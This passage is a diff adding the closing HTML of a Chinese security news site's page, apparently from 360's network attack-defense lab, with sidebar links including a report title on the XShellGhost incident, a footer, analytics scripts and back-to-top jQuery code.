+                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
+            </ul>
+</div>        <!-- 友情链接 -->
+        <div class="mod blog-links mobile-hide">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
+        <a href="/links/index.html" class="more">更多<i></i></a>
+    </div>
+        <ul class="links-list">
+                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
+                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
+                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
+                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
+                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
+                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
+                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
+                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
+                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
+                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
+            </ul>
+    </div>
+        <!-- 联系我们 -->
+        <div class="mod contact mobile-hide" style="text-align:center">
+    <div class="head-bar clearfix">
+        <h2><i></i><span>关注我们</span></h2>
+    </div>
+    <!-- 微信关注 -->
+    <ul class="contact-way">
+        <li><a>微信关注</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+    <!-- APP下载 -->
+    <ul class="contact-way">
+        <li><a>安全播报APP</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+</div>
+
+    </div>
+</div>
+
+<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/common.js?v=4.5"></script>
+<script>$(function() {sync_count('comment');});</script>
+
+
+<!-- 语法高亮 -->
+<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
+<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
+    </div>
+
+        <div class="footer">
+        <div class="friend-link">
+            <a href="http://www.360.cn/" target="_blank">360首页</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">关于我们</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">联系我们</a>
+            <span>|</span>
+            <a href="/links/index.html" target="_blank">友情链接</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">招贤纳士</a>
+        </div>
+        <div class="copy">
+            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
+        </div>
+    </div>
+    
+</div>
+
+<!--奇舞团统计-->
+
+<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
+<script>
+    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
+</script>
+
+<div class="hide">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
+</div>
+<div class="backToTop_wrap off">
+    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
+</div>
+<script>
+    var $backToTop_wrap = $(".backToTop_wrap"),
+        $backToTop_btn = $("#back_to_top");
+
+    if ($(window).scrollTop() > 100) {
+        $backToTop_wrap.removeClass("off");
+    }
+    else {
+        $backToTop_wrap.addClass("off");
+    }
+
+    $(window).on("scroll", function () {
+        if ($(this).scrollTop() > 100) {
+            $backToTop_wrap.removeClass("off");
+        }
+        else {
+            $backToTop_wrap.addClass("off");
+        }
+    });
+
+    $backToTop_btn.on("click", function () {
+        $("html, body").animate({scrollTop: 0}, 120);
+    });
+
+    $(function () {
+        var navlist = $('.nav-list > li');
+
+        navlist.each(function () {
+            $(this).on('mouseenter', function () {
+                $(this).addClass('selected');
+            });
+
+            $(this).on('mouseleave', function () {
+                $(this).removeClass('selected');
+            });
+        });
+    })
+</script>
+
+
+
+</body>
+</html>
